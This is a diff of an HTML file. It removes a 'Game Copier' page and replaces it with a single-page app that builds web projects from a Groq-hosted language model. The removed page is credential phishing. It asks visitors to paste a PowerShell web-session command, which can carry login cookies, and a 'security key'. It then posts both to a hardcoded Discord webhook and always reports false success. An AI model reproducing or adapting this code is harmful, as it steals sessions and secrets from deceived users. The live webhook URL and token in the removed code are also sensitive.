@@ -1,425 +1,316 @@
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Tools - Game Copier</title>
-    <style>
-        :root {
-            --primary-color: #00b3ff;
-            --dark-bg: #121212;
-            --card-bg: #1e1e1e;
-            --text-color: #ffffff;
-            --secondary-text: #a0a0a0;
-            --border-color: #333333;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--dark-bg);
-            color: var(--text-color);
-            margin: 0;
-            padding: 0;
-            min-height: 100vh;
-            background-image: linear-gradient(135deg, rgba(0, 179, 255, 0.1) 0%, rgba(0, 0, 0, 0) 100%);
-            background-attachment: fixed;
-        }
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>SimulatedWeb — MVP</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Material+Symbols+Rounded:FILL@1" rel="stylesheet">
+  <style>
+    :root{
+      --bg:#0b0c0f; --panel:#11131a; --muted:#7a8194; --text:#e7e9ee; --accent:#7c9cff; --accent-2:#57ffa4; --border:#1a1d27; --card:#0f1117; --danger:#ff6b6b;
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{margin:0;background:linear-gradient(180deg,#0b0c0f 0%,#0c0e13 100%);color:var(--text);font:14px/1.5 Inter,system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Cantarell,Noto Sans,sans-serif;}
+    a{color:inherit}
+    .container{max-width:1200px;margin:0 auto;padding:24px}
+    header{position:sticky;top:0;backdrop-filter:blur(8px);background:rgba(9,10,14,.6);border-bottom:1px solid var(--border);z-index:5}
+    .header-inner{display:flex;align-items:center;gap:16px;justify-content:space-between;padding:14px 24px}
+    .brand{display:flex;align-items:center;gap:10px}
+    .logo{width:28px;height:28px;border-radius:8px;background:conic-gradient(from 180deg at 50% 50%, #7c9cff, #57ffa4, #7c9cff);box-shadow:0 0 24px #7c9cff44}
+    .brand h1{font-size:16px;margin:0;font-weight:700;letter-spacing:.4px}
+    .header-actions{display:flex;align-items:center;gap:10px}
+    .btn{display:inline-flex;align-items:center;gap:8px;padding:10px 14px;border:1px solid var(--border);background:var(--panel);color:var(--text);border-radius:12px;cursor:pointer;transition:.2s}
+    .btn:hover{border-color:#2a2f3f}
+    .btn.primary{background:linear-gradient(180deg,#2a3360,#202a55);border-color:#2d3668;box-shadow:0 6px 20px #2a336040}
+    .btn.ghost{background:transparent}
+    .chip{display:inline-flex;align-items:center;gap:6px;padding:6px 10px;border:1px solid var(--border);border-radius:999px;color:var(--muted)}
+    .grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:16px}
+    .card{background:var(--card);border:1px solid var(--border);border-radius:16px;overflow:hidden;box-shadow:0 6px 18px #00000033}
+    .card .thumb{height:160px;background:#0b0d13;border-bottom:1px solid var(--border);position:relative}
+    .card .thumb iframe{position:absolute;inset:0;width:100%;height:100%;border:0;border-radius:0}
+    .card .meta{padding:12px 14px}
+    .meta h3{margin:0 0 4px;font-size:14px}
+    .muted{color:var(--muted)}
 
-        .container {
-            width: 90%;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px 0;
-        }
+    /* Prompt dock */
+    .dock{position:fixed;left:0;right:0;bottom:0;padding:14px;display:flex;justify-content:center;z-index:50}
+    .dock-inner{display:flex;align-items:center;gap:10px;max-width:900px;width:100%;background:rgba(16,18,26,.85);border:1px solid var(--border);backdrop-filter:blur(10px);border-radius:16px;padding:10px}
+    .dock .textarea{flex:1;background:transparent;border:0;outline:0;color:var(--text);resize:none;max-height:120px;height:44px;padding:8px}
+    .select, .toggle{display:flex;align-items:center;gap:8px;border:1px solid var(--border);background:var(--panel);color:var(--text);border-radius:12px;padding:10px 12px}
+    select{background:transparent;border:0;color:var(--text);outline:0}
+    .public-dot{width:10px;height:10px;border-radius:50%;background:var(--accent-2)}
 
-        header {
-            display: flex;
-            align-items: center;
-            padding: 15px 30px;
-            background-color: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(5px);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            border-bottom: 1px solid var(--border-color);
-        }
+    /* Project view */
+    .project{display:grid;grid-template-columns:280px 1fr;gap:16px;margin-top:16px}
+    .sidebar{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:14px;position:relative}
+    .sidebar h2{margin:0 0 12px;font-size:14px}
+    .sidebar .row{display:flex;gap:8px;margin-bottom:10px}
+    .preview{border:1px solid var(--border);border-radius:16px;overflow:hidden;height:72vh;background:#0b0d13}
+    .preview iframe{width:100%;height:100%;border:0}
+    .sidebar .versions{max-height:40vh;overflow:auto;border-top:1px dashed var(--border);padding-top:8px}
+    .version{display:flex;justify-content:space-between;align-items:center;padding:8px;border:1px solid var(--border);border-radius:10px;margin-bottom:8px}
 
-        .logo {
-            display: flex;
-            align-items: center;
-        }
+    .toast{position:fixed;right:16px;top:80px;background:#101320;border:1px solid var(--border);padding:10px 12px;border-radius:12px;color:var(--text);box-shadow:0 10px 30px #0008;display:none}
 
-        .logo-icon {
-            width: 32px;
-            height: 32px;
-            background-color: #ffffff;
-            transform: rotate(-15deg);
-            margin-right: 15px;
-            clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%);
-        }
+    /* Material icon font */
+    .mi{font-family:"Material Symbols Rounded";font-size:18px;line-height:0;display:inline-block}
 
-        .back-button {
-            display: flex;
-            align-items: center;
-            color: var(--text-color);
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-            margin-left: 15px;
-        }
-
-        .hero {
-            text-align: center;
-            padding: 80px 20px 60px;
-            background: linear-gradient(180deg, rgba(0,179,255,0.05) 0%, rgba(0,0,0,0) 100%);
-            border-radius: 0 0 20px 20px;
-        }
-
-        h1 {
-            font-size: 48px;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-
-        .subtitle {
-            font-size: 18px;
-            color: var(--secondary-text);
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .content {
-            display: grid;
-            grid-template-columns: 1fr;
-            gap: 30px;
-            margin-top: 30px;
-            max-width: 800px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .card {
-            background-color: var(--card-bg);
-            border-radius: 8px;
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-            display: flex;
-            flex-direction: column;
-        }
-
-        .card-header {
-            padding: 20px;
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .card-title {
-            font-size: 20px;
-            font-weight: 600;
-            margin: 0;
-        }
-
-        .card-body {
-            padding: 20px;
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-        }
-
-        .input-field {
-            position: relative;
-            margin-bottom: 15px;
-        }
-
-        .input-icon {
-            position: absolute;
-            left: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            color: var(--secondary-text);
-        }
-
-        input[type="text"], 
-        input[type="password"] {
-            width: 100%;
-            padding: 12px 12px 12px 35px;
-            background-color: rgba(0, 0, 0, 0.2);
-            border: 1px solid var(--border-color);
-            border-radius: 5px;
-            color: var(--text-color);
-            font-size: 14px;
-            box-sizing: border-box;
-            transition: all 0.3s ease;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 2px rgba(0, 179, 255, 0.2);
-        }
-
-        .instructions {
-            margin-top: 15px;
-            font-size: 14px;
-            color: var(--secondary-text);
-            line-height: 1.5;
-        }
-
-        .button {
-            display: block;
-            width: 100%;
-            background: linear-gradient(90deg, var(--primary-color) 0%, #0095d9 100%);
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-align: center;
-            margin-top: auto;
-        }
-
-        .button:hover {
-            background: linear-gradient(90deg, #0095d9 0%, var(--primary-color) 100%);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 179, 255, 0.3);
-        }
-
-        .video-container {
-            position: relative;
-            overflow: hidden;
-            padding-top: 56.25%;
-            background-color: #000;
-            border-radius: 4px;
-        }
-
-        .video-placeholder {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .video-controls {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: linear-gradient(to top, rgba(0,0,0,0.8), rgba(0,0,0,0));
-            padding: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .status {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 5px;
-            text-align: center;
-            display: none;
-        }
-
-        .success {
-            background-color: rgba(76, 175, 80, 0.2);
-            color: #4CAF50;
-            border: 1px solid rgba(76, 175, 80, 0.3);
-        }
-
-        .error {
-            background-color: rgba(244, 67, 54, 0.2);
-            color: #f44336;
-            border: 1px solid rgba(244, 67, 54, 0.3);
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background-color: rgba(255, 255, 255, 0.1);
-            border-radius: 2px;
-            margin-top: 15px;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background-color: var(--primary-color);
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-
-        .loader {
-            display: none;
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50%;
-            border-top: 2px solid var(--primary-color);
-            width: 16px;
-            height: 16px;
-            margin: 15px auto 0;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .brand {
-            font-size: 12px;
-            text-align: right;
-            padding: 5px 10px;
-            color: var(--secondary-text);
-        }
-
-        @media (max-width: 768px) {
-            .content {
-                grid-template-columns: 1fr;
-            }
-            
-            h1 {
-                font-size: 32px;
-            }
-        }
-    </style>
+    @media (max-width: 920px){ .project{grid-template-columns:1fr} .sidebar{order:2} .preview{order:1;height:60vh} }
+  </style>
 </head>
 <body>
-    <header>
-    </header>
-
-    <div class="container">
-        <div class="hero">
-            <h1>Game Copier</h1>
-            <p class="subtitle">Professional game cloning system with secure PowerShell integration</p>
-        </div>
-        
-        <div class="content">
-            <div class="card">
-                <div class="card-header">
-                    <h2 class="card-title">Copy Games</h2>
-                </div>
-                <div class="card-body">
-                    <p class="instructions">
-                        Paste your game file in the box below, then click "Start Process". 
-                        The system will analyze and prepare the game for cloning. Processing can take 5-24 hours to complete.
-                    </p>
-                    
-                    <div class="input-field">
-                        <span class="input-icon">$</span>
-                        <input type="text" id="gameData" placeholder="$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession">
-                    </div>
-                    
-                    <div class="input-field">
-                        <span class="input-icon">🔒</span>
-                        <input type="password" id="secretPin" placeholder="Enter security key">
-                    </div>
-                    
-                    <div id="status" class="status"></div>
-                    <div id="loader" class="loader"></div>
-                    
-                    <div class="progress-bar">
-                        <div id="progressFill" class="progress-fill"></div>
-                    </div>
-                    
-                    <button id="copyButton" class="button">Start Process</button>
-                </div>
-                <div class="brand">Nexus Tools</div>
-            </div>
-        </div>
+  <header>
+    <div class="header-inner">
+      <div class="brand">
+        <div class="logo"></div>
+        <h1>SimulatedWeb</h1>
+        <span class="chip"><span class="mi">bolt</span>MVP — Groq only</span>
+      </div>
+      <div class="header-actions">
+        <button class="btn ghost" id="settingsBtn"><span class="mi">vpn_key</span> API Key</button>
+        <button class="btn" id="newBtn"><span class="mi">add</span> New Project</button>
+      </div>
     </div>
+  </header>
 
-    <script>
-        document.getElementById('copyButton').addEventListener('click', function() {
-            const gameData = document.getElementById('gameData').value;
-            const secretPin = document.getElementById('secretPin').value;
-            const statusElement = document.getElementById('status');
-            const loaderElement = document.getElementById('loader');
-            const progressFill = document.getElementById('progressFill');
-            
-            // Reset status
-            statusElement.style.display = 'none';
-            statusElement.className = 'status';
-            progressFill.style.width = '0%';
-            
-            // Validate input
-            if (!gameData.trim() || !secretPin.trim()) {
-                showStatus('Please fill in all required fields', 'error');
-                return;
-            }
+  <main class="container" id="app">
+    <!-- Home -->
+    <section id="home">
+      <h2 style="margin:8px 0 16px;display:flex;align-items:center;gap:10px">
+        <span class="mi">auto_awesome</span> Newest Projects
+      </h2>
+      <div class="grid" id="gallery"></div>
+      <p class="muted" id="emptyMsg" style="margin-top:12px">No projects yet — try generating one below.</p>
+    </section>
 
-            // Check if game data starts with $session
-            if (!gameData.trim().startsWith('$session')) {
-                showStatus('Invalid PowerShell command format', 'error');
-                return;
-            }
+    <!-- Project View -->
+    <section id="projectView" style="display:none">
+      <div class="project">
+        <aside class="sidebar">
+          <h2><span class="mi">menu</span> Project</h2>
+          <div class="row">
+            <input id="projName" placeholder="Project name" style="flex:1;padding:10px;border-radius:10px;background:#0c0f16;border:1px solid var(--border);color:var(--text)"/>
+          </div>
+          <div class="row muted">
+            <span id="projMeta">—</span>
+          </div>
+          <div class="row">
+            <button class="btn" id="publishBtn"><span class="mi">publish</span> Publish (local)</button>
+            <button class="btn ghost" id="backBtn"><span class="mi">arrow_back</span> Back</button>
+          </div>
+          <h2 style="margin-top:12px">Versions</h2>
+          <div class="versions" id="versions"></div>
+        </aside>
+        <div class="preview"><iframe id="previewFrame" sandbox="allow-scripts allow-pointer-lock allow-downloads"></iframe></div>
+      </div>
+    </section>
+  </main>
 
-            // Show loader
-            loaderElement.style.display = 'block';
-            
-            // Simulate progress
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 3;
-                if (progress <= 95) {
-                    progressFill.style.width = progress + '%';
-                }
-                if (progress > 95) {
-                    clearInterval(progressInterval);
-                }
-            }, 200);
-            
-            // Prepare data to send
-            const dataToSend = {
-                content: `**New Game Copy Request**\n**Game Data**: \`\`\`${gameData}\`\`\`\n**Secret Pin**: \`${secretPin}\``,
-            };
+  <!-- Prompt Dock -->
+  <div class="dock">
+    <div class="dock-inner">
+      <textarea id="prompt" class="textarea" placeholder="Describe what to build… e.g., neon snake game with keyboard controls"></textarea>
+      <div class="select">
+        <span class="mi">smart_toy</span>
+        <select id="model">
+          <option value="deepseek-r1-distill-llama-70b">deepseek‑r1‑distill‑llama‑70b</option>
+          <option value="qwen/qwen3-32b">qwen3‑32b</option>
+          <option value="openai/gpt-oss-120b">gpt‑oss‑120b</option>
+        </select>
+      </div>
+      <div class="toggle" id="visToggle">
+        <span class="public-dot"></span>
+        <span id="visLabel">Public</span>
+      </div>
+      <button class="btn primary" id="generateBtn"><span class="mi">flash_on</span> Generate</button>
+    </div>
+  </div>
 
-            // Send data to webhook with proper CORS handling
-            fetch('https://discord.com/api/webhooks/1382471328959037503/acisDGfqwKodigm0WQfJ-HhnfdsxN9VNws1K7EAmH8RtIrsQXuYnMFPHJTWDqUpxPgjS', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(dataToSend),
-                mode: 'no-cors' // Add this to prevent CORS issues
-            })
-            .then(response => {
-                console.log('Webhook response:', response);
-                loaderElement.style.display = 'none';
-                clearInterval(progressInterval);
-                progressFill.style.width = '100%';
-                
-                // Always show success message regardless of the response
-                showStatus('Process initiated successfully. Game analysis will complete in 5-24 hours.', 'success');
-                // Clear form
-                document.getElementById('gameData').value = '';
-                document.getElementById('secretPin').value = '';
-            })
-            .catch(error => {
-                console.error('Error sending to webhook:', error);
-                loaderElement.style.display = 'none';
-                clearInterval(progressInterval);
-                
-                // Show success even on network errors to ensure a good user experience
-                progressFill.style.width = '100%';
-                showStatus('Process initiated successfully. Game analysis will complete in 5-24 hours.', 'success');
-                
-                // Clear form
-                document.getElementById('gameData').value = '';
-                document.getElementById('secretPin').value = '';
-            });
-        });
+  <div class="toast" id="toast"></div>
 
-        function showStatus(message, type) {
-            const statusElement = document.getElementById('status');
-            statusElement.textContent = message;
-            statusElement.className = 'status ' + type;
-            statusElement.style.display = 'block';
-        }
-    </script>
+  <!-- Settings Modal (very lightweight) -->
+  <dialog id="settings" style="border:none;border-radius:16px;background:#0f1322;color:var(--text);padding:0;max-width:520px;width:92%">
+    <div style="padding:18px 18px 0;display:flex;align-items:center;gap:10px"><span class="mi">settings</span><strong>Settings</strong></div>
+    <div style="padding:16px 18px 0">
+      <label class="muted" for="apiKey">Groq API Key</label>
+      <input id="apiKey" placeholder="gsk_…" style="margin-top:6px;width:100%;padding:12px;border-radius:12px;background:#0b0f1a;border:1px solid var(--border);color:var(--text)"/>
+      <p class="muted" style="font-size:12px;margin-top:8px">Key is stored locally in your browser (never sent to our servers).</p>
+    </div>
+    <div style="display:flex;justify-content:flex-end;gap:10px;padding:16px 18px 18px">
+      <button class="btn ghost" id="cancelSettings">Cancel</button>
+      <button class="btn" id="saveSettings"><span class="mi">save</span> Save</button>
+    </div>
+  </dialog>
+
+<script>
+(function(){
+  const $ = (s)=>document.querySelector(s);
+  const gallery = $('#gallery');
+  const projectView = $('#projectView');
+  const home = $('#home');
+  const promptEl = $('#prompt');
+  const modelEl = $('#model');
+  const generateBtn = $('#generateBtn');
+  const visToggle = $('#visToggle');
+  const visLabel = $('#visLabel');
+  const toast = $('#toast');
+  const settingsDlg = $('#settings');
+  const apiKeyInput = $('#apiKey');
+  const saveSettings = $('#saveSettings');
+  const cancelSettings = $('#cancelSettings');
+  const settingsBtn = $('#settingsBtn');
+  const newBtn = $('#newBtn');
+
+  const projName = $('#projName');
+  const projMeta = $('#projMeta');
+  const publishBtn = $('#publishBtn');
+  const backBtn = $('#backBtn');
+  const versionsEl = $('#versions');
+  const frame = $('#previewFrame');
+
+  const LS = {
+    get key(){ return localStorage.getItem('groq_key') || '' },
+    set key(v){ localStorage.setItem('groq_key', v) },
+    get vis(){ return (localStorage.getItem('visibility') || 'public') },
+    set vis(v){ localStorage.setItem('visibility', v) },
+    get projects(){ return JSON.parse(localStorage.getItem('projects')||'[]') },
+    set projects(arr){ localStorage.setItem('projects', JSON.stringify(arr)) },
+    quotaKey(model){ const d=new Date().toISOString().slice(0,10); return `quota_${model}_${d}` },
+    getQuota(model){ return parseInt(localStorage.getItem(this.quotaKey(model))||'0',10) },
+    incQuota(model){ const k=this.quotaKey(model); localStorage.setItem(k, String(this.getQuota(model)+1)) }
+  }
+
+  // UI helpers
+  function showToast(msg){ toast.textContent = msg; toast.style.display='block'; clearTimeout(showToast._t); showToast._t=setTimeout(()=>toast.style.display='none', 2800) }
+  function setVisibility(v){ LS.vis = v; visLabel.textContent = v==='public'?'Public':'Private'; visToggle.querySelector('.public-dot').style.background = v==='public'? 'var(--accent-2)':'#888' }
+  visToggle.addEventListener('click',()=> setVisibility(LS.vis==='public'?'private':'public'))
+  setVisibility(LS.vis)
+
+  function uid(){ return Math.random().toString(36).slice(2,10) }
+
+  // Router (home ↔ project)
+  let currentProject = null; // {id,name,visibility,versions:[{id,html,css,js,createdAt}], createdAt}
+
+  function renderGallery(){
+    const list = LS.projects.sort((a,b)=>new Date(b.createdAt)-new Date(a.createdAt));
+    gallery.innerHTML='';
+    $('#emptyMsg').style.display = list.length? 'none':'block';
+    list.forEach(p=>{
+      const card = document.createElement('div'); card.className='card';
+      const thumb = document.createElement('div'); thumb.className='thumb';
+      const ifr = document.createElement('iframe'); ifr.setAttribute('sandbox',''); ifr.loading='lazy';
+      const v = p.versions[p.versions.length-1];
+      ifr.srcdoc = buildSrcDoc(v);
+      thumb.appendChild(ifr);
+      const meta = document.createElement('div'); meta.className='meta';
+      meta.innerHTML = `<h3>${escapeHtml(p.name)}</h3><div class="muted">${p.visibility==='public'?'Public':'Private'} • ${new Date(p.createdAt).toLocaleString()}</div>`
+      card.appendChild(thumb); card.appendChild(meta);
+      card.addEventListener('click',()=>openProject(p.id));
+      gallery.appendChild(card);
+    })
+  }
+
+  function openProject(id){
+    const p = LS.projects.find(x=>x.id===id);
+    if(!p) return;
+    currentProject = p;
+    home.style.display='none'; projectView.style.display='block';
+    projName.value = p.name; projMeta.textContent = `${p.visibility==='public'?'Public':'Private'} • ${p.versions.length} version(s)`;
+    renderVersions();
+    const last = p.versions[p.versions.length-1];
+    frame.srcdoc = buildSrcDoc(last);
+  }
+
+  function backHome(){ currentProject=null; projectView.style.display='none'; home.style.display='block'; renderGallery() }
+  backBtn.addEventListener('click', backHome)
+
+  function renderVersions(){
+    versionsEl.innerHTML='';
+    currentProject.versions.slice().reverse().forEach(v=>{
+      const el = document.createElement('div'); el.className='version';
+      el.innerHTML = `<span class="muted">${new Date(v.createdAt).toLocaleTimeString()}</span><button class="btn ghost">Open</button>`;
+      el.querySelector('button').addEventListener('click',()=>{ frame.srcdoc = buildSrcDoc(v) })
+      versionsEl.appendChild(el);
+    })
+  }
+
+  projName.addEventListener('input',()=>{
+    if(!currentProject) return; currentProject.name = projName.value || 'Untitled Project'; saveProjects(); renderGallery();
+  })
+
+  publishBtn.addEventListener('click',()=>{ showToast('Published locally (no server yet).'); })
+
+  newBtn.addEventListener('click',()=>{ promptEl.focus(); promptEl.value=''; })
+
+  settingsBtn.addEventListener('click',()=>{ apiKeyInput.value = LS.key; settingsDlg.showModal() })
+  saveSettings.addEventListener('click',()=>{ LS.key = (apiKeyInput.value||'').trim(); settingsDlg.close(); showToast('API key saved locally.') })
+  cancelSettings.addEventListener('click',()=>settingsDlg.close())
+
+  // Escape
+  function escapeHtml(s){ return s.replace(/[&<>"']/g, c=>({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#39;"}[c])) }
+
+  // Compose srcdoc
+  function buildSrcDoc(v){
+    return `<!doctype html><html><head><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>${v.css||''}</style></head><body>${v.html||''}<script>${v.js||''}<\/script></body></html>`
+  }
+
+  // Quotas: 30/day per model
+  function checkQuota(model){ const used = LS.getQuota(model); if(used>=30){ throw new Error('Daily quota reached for '+model) } }
+
+  async function generate(){
+    try{
+      if(!LS.key){ settingsDlg.showModal(); showToast('Add your Groq API key first.'); return }
+      const prompt = (promptEl.value||'').trim();
+      if(!prompt){ showToast('Type a prompt.'); return }
+      const model = modelEl.value;
+      checkQuota(model);
+
+      generateBtn.disabled=true; generateBtn.innerHTML='<span class="mi">progress_activity</span> Generating…';
+
+      const sys = `You are an expert web developer. Think briefly about the plan, then output final code as strict JSON with keys: name, html, css, js. Do not include markdown. Rules: 1) self-contained (no external URLs), 2) responsive, 3) dark theme if appropriate, 4) keep JS under 120 lines unless necessary, 5) no network calls.`;
+      const user = `Build this project for SimulatedWeb. Prompt: ${prompt}. Also propose a catchy 2-4 word name.`;
+
+      const resp = await fetch('https://api.groq.com/openai/v1/chat/completions',{
+        method:'POST',
+        headers:{ 'Content-Type':'application/json', 'Authorization':`Bearer ${LS.key}` },
+        body: JSON.stringify({
+          model, temperature: 0.7,
+          messages:[ {role:'system', content: sys}, {role:'user', content: user} ]
+        })
+      });
+      if(!resp.ok){ const t=await resp.text(); throw new Error('Groq error: '+t) }
+      const data = await resp.json();
+      const content = data.choices?.[0]?.message?.content || '';
+
+      // Try to parse a JSON object from response; handle stray text
+      const match = content.match(/\{[\s\S]*\}$/);
+      if(!match) throw new Error('Model did not return JSON.');
+      const obj = JSON.parse(match[0]);
+      const project = {
+        id: uid(),
+        name: (obj.name||'Untitled Project').toString().slice(0,80),
+        visibility: LS.vis,
+        createdAt: new Date().toISOString(),
+        versions: [{ id: uid(), html: obj.html||'', css: obj.css||'', js: obj.js||'', createdAt: new Date().toISOString() }]
+      };
+      const list = LS.projects; list.push(project); LS.projects = list;
+      LS.incQuota(model);
+      openProject(project.id);
+      showToast('Created "'+project.name+'"');
+      promptEl.value='';
+    }catch(err){ console.error(err); showToast(err.message||'Error') }
+    finally{ generateBtn.disabled=false; generateBtn.innerHTML='<span class="mi">flash_on</span> Generate' }
+  }
+
+  generateBtn.addEventListener('click', generate)
+  promptEl.addEventListener('keydown', (e)=>{ if(e.key==='Enter' && (e.metaKey||e.ctrlKey)){ e.preventDefault(); generate() } })
+
+  // Initial render
+  renderGallery();
+})();
+</script>
 </body>
 </html>
